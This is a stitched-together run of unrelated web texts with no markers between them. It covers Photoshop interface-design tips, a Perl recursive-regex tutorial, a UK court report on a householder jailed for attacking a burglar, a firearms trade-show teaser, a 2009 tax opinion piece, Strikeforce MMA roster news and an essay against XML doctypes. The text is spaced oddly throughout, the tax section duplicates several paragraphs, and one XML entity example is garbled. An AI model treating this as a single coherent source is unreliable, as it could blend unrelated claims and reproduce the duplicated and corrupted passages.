Next time you want to create something shiny , think about what type of material you 're really executing : is it plastic ?
Glass ?
Reflective aluminum ?
If you 're designing a matte element , think about just how grainy and textured it should be .
Paper or sandpaper ?
Cardboard or anodized aluminum like an iMac ?
Is there transparency ?
Are you emulating something in real life or creating a material that 's more hyperrealistic ?
Tips For Execution
It 's one thing to look at beautiful interface elements , icons and illustrations and quite another to build them yourself .
Here are some ways that I build designs using Photoshop .
Noise Layer
Matte interfaces are hot right now and one of the key elements of a matte surface is that it's not perfectly symmetrical , it has some texture and grain to it .
The easiest way to accomplish this is by creating a layer of one flat color and then using the Noise Filter to add some texture .
The key is to keep it subtle and barely noticeable .
Radial Highlights
The main light source comes from the top but that does n't mean you can't introduce a secondary light source for emphasis .
Below I 've created a custom navigation bar for an iPhone application that uses a subtle radial highlight for added dimension and detail .
The Blend Mode has been set to Overlay to brighten and saturate the overall color and the transparency has been knocked way down to keep it realistic .
Also note the edge highlights to make it look more like a raised surface .
Creative Layer Styles
Layer Styles are a key part of my design workflow , I use them for everything .
Usually I 'll draw a vector object , set the Fill to 0 % , and design the entire thing using Layer Styles .
Anyone can add a Drop Shadow to something , but if you get creative with Layer Styles then it enables you to really transform what you 're working on .
For example , you can only apply one Stroke but you can emulate 3 - 4 different stroke styles through creative use of the Inner Glow and Outer Glow styles if you crank up the Spread and Choke sliders and turn your glows into solid lines .
Once you turn glows and drop shadow styles into solid lines you can achieve a lot of effects with minimal effort .
Below are some Layer Styles applied to rounded rectangles that use 1 px glows and shadows .
The PSD file for the following examples is released under a Creative Commons license : Button Examples
Reality Is Subtle
When something looks " off " in an interface , it probably looks fake , like it would n't exist in the real world .
How do you keep your interface elements looking real ?
Here are some things to always keep in mind :
Keep it crisp .
No blurry lines or edges .
Always adjust opacity .
Nothing is totally black or white , dark or bright .
A semi-transparent black or white line , glow , shadow or shape goes a long way .
Go vector when you can , it can be resized later .
Do n't Free Transform vector objects : use the Direct Selection Tool to move individual points .
Experiment with Layer Styles .
White Inner Glow makes shapes pop .
Use Overlay blending mode to liven up and saturate colors .
Drop Shadows will ruin your design if you do n't do it right .
Things should be right up against their surface which means using a 1 - 3 px Drop Shadow size .
And 0 - 3 px distance .
This is n't WordArt .
To save a complex shape as a PNG or GIF , turn the layer into a Smart Object first , then Rasterize it .
This preserves color blending modes .
When using type within an interface element , it either sits on top ( dark 1px drop shadow ) or is inset ( white 1px drop shadow ) , it 's never at the same surface as a button or widget .
Real - world objects rarely have perfectly square corners .
Use subtle rounded corners to make objects look real .
In real life , everything casts a shadow .
Unless you 're drawing vampires , if you intend your object to have depth and be resting on a surface then it better have a drop shadow , even an incredibly subtle one .
The regular expressions we use in our daily lives are actually not that " regular . "
Most of the languages support some kind of extended regular expressions that are computationally more powerful than the " regular " regular expressions as defined by the formal language theory .
For instance , the so often used capture buffers add auxiliary storage to the regular expressions that allow them to match an arbitrary pattern repeatedly .
Or look - ahead assertions that allow the regular expression engine to peek ahead before it making a decision .
These extensions make regular expressions powerful enough to describe some context - free grammars .
The Perl programming language has an especially rich with regex engine .
One of the engine 's features is the lazy regular subexpressions .
The lazy regular subexpressions are expressed as ( ??{ code } ) , where the " code " is arbitrary Perl code that gets executed when the moment this subexpression may match .
This allows us to construct something really interesting - we can define a regular expression that has itself in the " code " part .
The result is a recursive regular expression !
One of the classical problems that a regular expression can't match is the language 0n1n , i.e. , a string with a number of zeroes followed by an equal number of ones .
Surprisingly , using the lazy regular subexpressions this problem becomes tractable !
Here is a Perl regular expression that matches 0n1n :
$ regex = qr/0 ( ??{ $ regex} ) ? 1/ ;
This regular expression matches a 0 followed by itself zero or one time , followed by a one .
If the itself part does n't match , then the string this regular expression matches is 01 .
If the itself part matches , the string this regular expression matches is 00 ( $ regex ) ?
11 , which is 0011 if $ regex does n't match or it 's 000 ( $ regex ) ?
111 if it matches , ... , etc .
Here is a Perl program that matches 050000150000 :
#!/usr /bin/perl $ str = " 0" x50000 .
" 1" x50000 ; $ regex = qr/0 ( ??{ $ regex} ) * 1/ ; if ( $ str =~ /^$ regex $ / ) { print " yes , it matches " } else { print " no , it does n't match " }
Now let 's look at the Yo Dawg regular expression in the picture above .
Can you guess what it does ?
It matches a fully parenthesized expression such as ( foo ( bar ( ) ) baz ) or balanced parentheses ( ( ( ) ( ) ( ) ) ( ) ) .
$ regex = qr/ \( # ( 1 ) match an open paren ( ( # followed by [ ^ ( ) ] + # ( 3 ) one or more non-paren character | # OR ( ??{$ regex} ) # ( 5 ) the regex itself ) * # ( 6 ) repeated zero or more times \) # ( 7 ) followed by a close paren ) /x ;
Here is how to think about this regular expression .
For an expression to be fully parenthesized , it has to start with an open paren , so we match it ( point ( 1 ) in the regex ) .
It also has to end with close paren , so we match a close paren at the end ( point ( 7 ) ) .
Now we have to think what can be in - between the parens ?
Well , we can either have some text that is neither an open paren or closed paren ( point ( 3 ) ) OR we can have another fully parenthesized expression ! ( point ( 5 ) ) .
And all this may be repeated either zero times ( point ( 6 ) ) to match the smallest fully parenthesized expression ( ) or more times to match a more complex expression .
Without the /x flag ( that allows multiline regexes ) , it can be written more compactly :
$ regex = qr / \ ( ( [ ^ ( ) ] +|(??{$ regex} ) ) *\ ) / ;
But please do n't use these regular expressions in production as they are too cryptic .
Use Text :: Balanced or Regexp : : Common Perl modules .
And finally , in Perl 5.10 you can use recursive capture buffers instead of lazy code subexpressions to achieve the same result .
Here is a regular expression that matches 0n1n and uses the recursive capture buffer syntax ( ?N ) :
my $rx = qr/(0 ( ? 1 ) * 1 ) /
The ( ? 1 ) * says " match the first group zero or more times , " where the first group is the whole regular expression .
You can try to rewrite the regular expression that matches balanced parens as an exercise .
Have fun !
Munir Hussain , left , and his brother Tokeer Hussain A Buckinghamshire businessman jailed for injuring a burglar who had attacked him and his family plans to appeal against his sentence , his lawyer said .
Munir Hussain , 53 , returned to his High Wycombe home to find three intruders who tied him and his family up .
He managed to escape and chased one of the offenders , hitting him with a cricket bat , Reading Crown Court heard .
Hussain 's solicitor said he planned to appeal against his 30 - month sentence for grievous bodily harm with intent .
' Revenge attack ' Michael Wolkind , defending Hussain , told the court his client was the " real victim " in the case .
The court heard Hussain and his brother Tokeer , who both live in Desborough Road , chased intruder Walid Salem , leaving him with a permanent brain injury after he was hit with a cricket bat so hard that it broke into three pieces .
Salem was the only intruder caught after the incident on 3 September 2008 , but his injuries meant he was not fit to plead after being charged with false imprisonment .
Salem was given a two - year supervision order at a court hearing in September this year .
The Hussain brothers were found guilty after a trial earlier this year .
The prosecution alleged two other men also took part in the so - called " revenge attack " with them .
' Public support ' Munir Hussain was given a 30 - month sentence while his brother was jailed for 39 months .
Judge John Reddihough said Munir Hussain 's family had been subjected to a " serious and wicked offence " but said he had carried out a " dreadful , violent attack " on Salem .
The judge said : " If persons were permitted to take the law into their own hands and inflict their own instant and violent punishment on an apprehended offender rather than letting justice take its course , then the rule of law and our system of criminal justice , which are the hallmarks of a civilised society , would collapse . "
Mr Wolkind said the case had similarities to that of farmer Tony Martin , who shot a teenage intruder , noting there was public support in both cases .
Hilary Neville , prosecuting , said : " What started as reasonable self defence by Munir Hussain then turned into excessive force by virtue of a sustained attack by Munir , Tokeer and at least two others . "

New Firearms & Stuff from the 2009 NASGW Show
by Jeff Quinn
November 8th , 2009
Updated November 10th , 2009
As I type this , I have been home just a few hours from the National Association of Sporting Goods Wholesalers Show in Reno , Nevada .
We have never attended that show before , but were requested to do so by a couple of gun makers and distributors , and I am glad that they asked us to attend .
This is the show where the manufacturers set up their wares , introducing new products for next year to the firearms distributors .
It has been a few months since the NRA Show , and SHOT is still about ten weeks away , so this was a good opportunity for me to get a sneak - peek at some new products that will be available to us later .
I am glad that I went , as I saw some things that will likely be of interest to some of our readers .
Below are just some pictures , but hopefully they will be enough to pique your interest , as they did mine .
The lighting in the show was not as good as it should have been .
I was not allowed to fire any of the weapons , but there are a few that I liked well enough to put in a request for a test gun , when available .
This is just a quick look at some interesting things to come .

Plucking the Feathers of Taxpaying Geese
December 21 , 2009 at 1:45 am
“ The art of taxation consists in so plucking the goose as to get the most feathers with the least hissing . ”
~ Jean Baptist Colbert
With exploding deficits , multiple wars , healthcare reform , and a sluggish economy , there are two logical immediate choices on how to improve our current financial situation :
1 ) Cut spending .
This is not a desirable option for politicians since benefit cuts to voters are not appreciated come re-election period .
2) Raise Taxes .
Not desirable from a voter standpoint either , but the Obama administration has chosen to target the rich – the smaller voting population .
This can of course backfire , when many of these wealthy individuals are campaign contributors or have ties to lobbyists who are backing the President ’s agendas .
The tax - paying geese are getting fatter , but before the goose can be put in the oven , the feathers need plucking with the goal of minimizing hissing .
Sure , I am an advocate for tax cuts like most taxpayers .
I ’m even a larger proponent , if Congress had the political gumption to cut spending to fund the tax drops .
Unfortunately , politicians view expense reduction as suicide because cutting programs or benefits will only lead to fewer reelection votes .
Congressmen are perfectly fine letting taxpayers live high on the hog for now , and just saddle future generations with our mounting debt problems .
What ’s Fair ?
The current strategy is based on taxing the wealthy to fund deficits , healthcare , wars , debt , etc .
Since the rich represent a smaller proportion of voters , from the egotistical politician standpoint ( reelection is paramount ) , this wealth distribution strategy appears more palatable to incumbent legislators .
Democrats would rather focus on squeezing a narrower demographic footprint of voters versus an across the board tax increase , which would impact all taxpayers .
Merely taxing the rich can certainly backfire however , especially if the wealthy demographic getting taxed is the exact population paying for the politicians ’ reelection and lobbying agendas .
But at what point is taxing the rich unfair and counterproductive ?
Currently the top 10 % of the nation that earns more than $ 92,400 a year , pay about 72 % of the country ’s income taxes .
Ari Fleischer , former G.W. Bush Press Secretary compares the current tax policy to an “ inverted pyramid scheme ” in a Wall street Journal Op - Ed earlier this year .
Like an upside spinning top , the whirling pyramid is supported by a narrow , pointy pinnacle .
Fleischer goes onto add :
“ According to the CBO , those who made less than $ 44,300 in 2001 — 60 % of the country — paid a paltry 3.3 % of all income taxes .
By 2005 , almost all of them were excused from paying any income tax .
They paid less than 1 % of the income tax burden .
Their share shrank even when taking into account the payroll tax .
In 2001 , the bottom 60 % paid 16.3 % of all taxes ; by 2005 their share was down to 14.3 % .
All the while , this large group of voters made 25.8 % of the nation ’s income .
When you make almost 26 % of the income and you pay only 0.6 % of the income tax , that ’s a good deal , courtesy of those who do pay income taxes . ”
Cheaters Should Not Be Exempt ( See Celebrity Tax Evader Article )
Certainly loopholes and undeserving credits for multinationals and the wealthy should be removed as well .
The House of Representatives recently approved a $ 387 million boost for the IRS to fund a high - wealth unit focusing on trusts , real estate investments , privately held companies and other business entities controlled by rich individuals ( read Reuters article ) .
The IRS is also opening new criminal offices in Beijing , Panama City and Sydney to focus on international enforcement of tax cheaters .
At the center of the IRS ’ offshore effort is the legal cases against Swiss banking giant UBS ( stands for Union Bank of Switzerland ) , which resulted in UBS agreeing to turn over almost 5,000 client names and pay $ 780 million to settle tax evasion charges .
Taxes in 2010 and Beyond
When it comes to future taxes , a lot of details remain up in the air .
What we do know is that the 2001 Bush tax cuts are set to expire in 2010 and the Obama administration has indicated they want to raise taxes on the rich ( those earning more than $ 250,000 ) and keep the cuts static for those in the lower paying tax brackets .
Healthcare :
If healthcare reform will indeed pass , those benefits wo n’t be free .
The Obama administration is backing a House bill that creates a 5.4 % surtax on income over $ 500,000 for single filers or $ 1 million for couples .
If healthcare reform will indeed pass , those benefits wo n’t be free .
The Obama administration is backing a House bill that creates a 5.4 % surtax on income over $ 500,000 for single filers or $ 1 million for couples .
Income Taxes :
On the income tax front , Obama and some Democrats are pushing to have the two highest tax brackets revert back to the pre-2001 levels of 36 % and 39.6 % .
On the income tax front , Obama and some Democrats are pushing to have the two highest tax brackets revert back to the pre-2001 levels of 36 % and 39.6 % .
Capital Gains :
If the Obama administration gets its way , capital - gains tax rates would go back to 20 % for wealthier individuals and qualified dividends would be taxed as ordinary income up to the top rate of 39.6 % .
If the Obama administration gets its way , capital - gains tax rates would go back to 20 % for wealthier individuals and qualified dividends would be taxed as ordinary income up to the top rate of 39.6 % .
Estate Taxes :
The House passed a bill earlier this month that makes the 2009 estate tax provisions permanent ( i.e. , a 45 % top marginal rate on estates larger than $ 3.5 million or $ 7 million for married couples ) .
If the Senate were not to pass the bill , current law has the estate tax rate reverting to a 55 % rate on estates worth more than $ 1 million after next year .
Given the exploding deficits and weary economy , which is recovering from a severe economic crisis , getting our tax policy situation back in order is critical .
Having politicians make tough tax policy decisions runs contrary to their partisan reelection agendas , however our country needs to pluck more feathers from our taxpaying geese to face these monumental economic challenges …even if it requires listening to irritating hissing from our citizens .

From the time it was announced that Strikeforce had a pay cable partner in Showtime and a potential broadcast partner in CBS , it was clear that their roster needed some depth .
Even with some notable talent like Jake Shields , Nick Diaz , Robbie Lawler , and the " on-again , off - again " Cung Le , the organization needed guys that were going to be able to headline events and interest mainstream fans in buying tickets , watching , and engaging in the product .
Gilbert Melendez against Josh Thomson and Bobby Southworth against Renato Sobral were nice and all , but that was n't going to get CBS excited .
Even with the explosion of Gina Carano and the inking of Fedor Emelianenko , there was still work to be done with filling out the cards between the events featuring their linchpin stars .
But with the financial juggernaut of the UFC having locked down nearly every free agent worth signing , while retaining all of their top talents , Strikeforce was in a tough spot with a busy 2010 calendar on the horizon .
Then , they got busy .
Culminating with Monday 's inking of UFC / PRIDE veteran Dan Henderson and Thursday night 's signing of heavyweight prospect Bobby Lashley , Scott Coker has been delivering a ton of early Christmas presents to Strikeforce fans .
For those of you looking to fill out your roster cards , I hope you 've been writing in pencil as there have been a lot of additions of late .
Bobby Lashley
News broke late Thursday night that former WWE talent and current TNA star Bobby Lashley had inked a long - discussed deal with Strikeforce .
A standout collegiate wrestler , Lashley joined WWE in 2004 and left in 2008 .
He decided to move into MMA and made his debut in Dec. 2008 .
Lashley is 4 - 0 in his young career with his last victory coming over Bob Sapp this past June .
He 's got personality , a killer look , and should be groomed as a heavyweight menace in 2010 .
Keep in mind that he 's still quite inexperienced and expecting Brock Lesnar - esque results is a bit much .
But with the wrestling audience now fully transfixed in MMA , this is a smart long - term sign by Strikeforce .
He 's expected to debut at the Strikeforce event in Sunrise , Florida , on Jan. 30 .
Dan Henderson
A 12 - year veteran , Henderson became a free agent after his highlight reel KO of Michael Bisping at UFC 100 this summer .
Part of a PR battle with the UFC due to his supposed Tito Ortiz - like pay demands , Henderson apparently grew tired of waiting and inked a four - fight , 16 - month contract and , according to him , will debut at an unannounced CBS event scheduled for the spring .
I guess the UFC banning Henderson 's Clinch Gear brand in the past months did n't help , eh ?
Is he a major draw at this point ?
No , but he's now easily one of the top fighters they have and provides legitimate talent to put in against everyone from Jake Shields at 185 to Gegard Mousasi at 205 and even Fedor at heavyweight .
He 's a valuable asset to the promotion but is soft - spoken and unfortunately , Strikeforce can't use any of his UFC / PRIDE footage to help sell him .
Regardless , this was a great sign .
KJ Noons
Make no mistake , the signing of Noons is to eventually pair him with rival Nick Diaz , whom he defeated back in Nov. 2007 via first - round TKO to become the first EliteXC lightweight champion .
What followed was an altercation involving Noons ' father and the Diaz brothers during the post - fight interviews making a rematch a definite .
However , it never came to fruition and Noons decided to focus on boxing for nearly the past 18 months .
It 's been a long time since he 's been in the cage ( Jun. ' 08 ) , but the 27 - year - old is looking to add to a 7 - 2 record with seven T / KOs — well worth the gamble for Coker .
The promotion for " Diaz vs. Noons " II should be great .
King Mo
At 28 years old , Muhammed " King Mo " Lawal brings persona and flair into the ring — something you usually do n't see with former NCAA wrestling champions .
Lawal has a long wrestling history and is 5 - 0 in his young career with four victories coming via T / KO .
He 's a versatile fighter for Coker , as he can fight at either light heavyweight or heavyweight and will face Mike Whitehead at the Dec. 19 event as a heavyweight .
He 's not ready for Fedor , but if he can beat Whitehead without suffering too many injuries , how about a tilt with Brett Rogers at the next CBS show ?
Melvin Manhoef
The 33 - year - old Manhoef is a kickboxing veteran ( 37 - 8 , 27 KOs ) and experienced in MMA ( 23-6 - 1 , 22 T/ KOs ) .
He 's lost two of his last three but one was to current Strikeforce light heavyweight champion Gegard Mousasi .
He only fought once in 2009 , a first - round submission loss to Paulo Filho in July .
When he debuts , do n't expect to see him in there for long .
His last eight fights did n't go past the first round and he 's never been past the second in his MMA career .
Expect a match against Robbie Lawler in ' 10 as it was originally discussed for the Dec. 19 event .
Ronaldo " Jacare " Souza and Matt Lindland
The 30 - year - old Souza debuts at the Dec. 19 show against Matt Lindland in the debut for both in Strikeforce .
Souza is 10 - 2 - 1 and is coming off a no-contest against Jason " Mayhem " Miller in May for Dream — where he 's spent his last five fights .
Another quick finisher ( just one career fight past the first round ) , the BJJ black belt Souza is a submission machine .
Enter Lindland , the MMA veteran who is looking for redemption after being violently KO'd by Vitor Belfort at Affliction 's last event in January .
The 39 - year - old does n't have many fights left , but is still 21 - 6 and has fought some names ( Belfort , Fedor , Rampage Jackson ) .
He 's worth a gamble for Strikeforce but could be out after one fight if he loses badly .
Jason " Mayhem " Miller
What list would be complete without the inclusion of " Mayhem " ?
The MTV crossover star that took Jake Shields to the limit at the CBS November show , can talk a great game and is a colorful character for a promotion that needs it .
While a rematch with Shields could be in the cards based on their recent Twitter war , I 'd like to see a three - rounder with another opponent to really gauge where Miller 's game is .
He 's still a valuable hand for Coker and could increase in value in ' 10 .
He can sell fights — go use him !
Roger Bowling
An early November signing , Bowling is a top young welterweight who will debut in February or March at a challengers event .
At 6 - 0 , he has n't even seen the second round and has four wins by T / KO and two by submission .
He 's a great addition to what 's become a staple in the challengers series :
A low - pressure , but important set of events in smaller venues that helps establish the next group of young fighters looking to make it to the big card .
This helps push the idea that the main Strikeforce / CBS events are an achievement so when they make it , they have accomplished something .
And then , there 's Roger Huerta .
The former Sports Illustrated cover boy became a free agent following a split decision loss to Gray Maynard in September that finished out his UFC contract .
Since deciding and then un-deciding to focus on Hollywood , Huerta has lost two in a row but at one point , was a highly regarded 155 after six straight wins in the octagon .
At 20 - 3 - 1 and just 26 years old , there is plenty of time in Huerta 's future if he 's willing to commit full - time to MMA , which sounds like it's in his plan .
Because of his inactivity the past two years ( just two fights ) , he does n't have the same wear and tear and would be a great addition to the Strikeforce roster .
Like Henderson , he 's not a guy that will make a huge difference at the box office but with his versatility and the right fights , Huerta could live up to his SI fame with some money matches against Melendez , Thomson and others if he went up in weight .
The key for Strikeforce is to keep going and cut guys that are n't worth the effort in favor of strengthening the roster with shrewd , yet aggressive signings like Henderson .
I also think they should be a bit more upfront in securing former TUF fighters that the UFC does n't retain .
They have instant recognition from 13 weeks on TV so why not give them a one - fight deal on a challengers show and see what they 've got ?
" UFC vs. Strikeforce " might not be the inter- promotional war that WWE and WCW was back in the late '90s , but Strikeforce can continue to make a nice name for themselves in 2010 if they are smart about tinkering with their roster .
There have been plenty of groups before them that have crashed and burned due to bad decisions , but I do n't think this is going to be one of them .

Back when we cooked up XML in 1996 - 97 , there were good reasons to have that ugly upper -case gibberish at the top of your XML documents .
That was almost ten years ago ; now it ’s time to do away with it , and also time to have a spec for Doctype - free XML .
Why DTDs ? · The Doctype declaration is supposed to do three different things for you :
Say what the root element of your document is supposed to be .
Point to your DTD , so you can check if the document is valid .
Define entities .
These are used as names for boilerplate strings , for special characters , and ( in theory ) to include external documents .
The first two are are not only unnecessary but actively harmful .
First of all , we have better technology than DTDs for doing syntax validation .
Second , it ’s usually a bad idea for a document to express an opinion as to what its own schema is .
Most useful languages have more than one schema , and it ’s the absolute right of someone receiving a document to decide whether it meets their definition of “ valid ” before they use it , so they ’re going to make their own decisions as to which schema ( if any ) is appropriate .
Entities as names for strings are handy but not essential .
Their use as names for non-ASCII characters will be missed ; people who write mathematics in a plain - text buffer have become used to typing δ for “ Δ ” , ∞ for “ ∞ ” , and so on .
But I ’m sitting here typing this document in a text editor and if I want to write Δ or ∞ or チムブレー , there are a bunch of ways I can do it without requiring any entities .
The problem only bites you when , first of all , you ’re hand - authoring your document without any help from the editor , and second , you ’re on an operating system that does n’t let you enter those characters .
This problem space is getting smaller every year .
The use of entities to include external documents has never really caught on , although in principle it sounds useful .
I suspect that at the end of the day , the encoding layer is just the wrong place to stick hyperlinking and document composition functions .
Actively Harmful · A lot of XML is used in network protocols , and in network protocols , <! DOCTYPE > is actively harmful .
Receiving software in principle might have to go and fetch an external DTD , or failing that , be prepared to deal with the voodoo around standalone = " yes / no " in the XML declaration .
For this reason , popular network applications of XML like SOAP simply forbid the Doctype declaration .
But this is kind of bad behavior , as RFC 3470 ( AKA BCP 70 ) points out , if you ’re going to use XML , it ’s best to just say “ Use XML ” and not get into subsetting the syntax .
So the take - away is , it would be nice to have an actual single spec for this kind of XML that leaves out all the complexity and black magic that falls out of the Doctype declaration .
We already have proposals .
Proposals · The Simplest Thing That Could Possibly Work is Norm Walsh ’s XMLK proposal from 2003 , which makes only one change to the XML specification : no <! DOCTYPE > .
Norm later on got a bit more ambitious and cooked up an XML 2.0 proposal , which not only nuked the Doctype but had clever proposals for new namespace and entity syntax .
Then there ’s my own XML - SW , which actually substantially rewrites the XML spec , removing the Doctype and at the same time weaving in the Namespaces and Infoset specifications , giving you one place to go to read about all the basic can ’t - live - without - ’em XML technologies .
The Future · I suspect that nothing will happen ; we ’ll go forward indefinitely into the future , with XML implementors required to read the XML spec , learn to ignore all the Doctype stuff , then go read the Namespaces and Infoset specs , and synthesize all that in their heads .
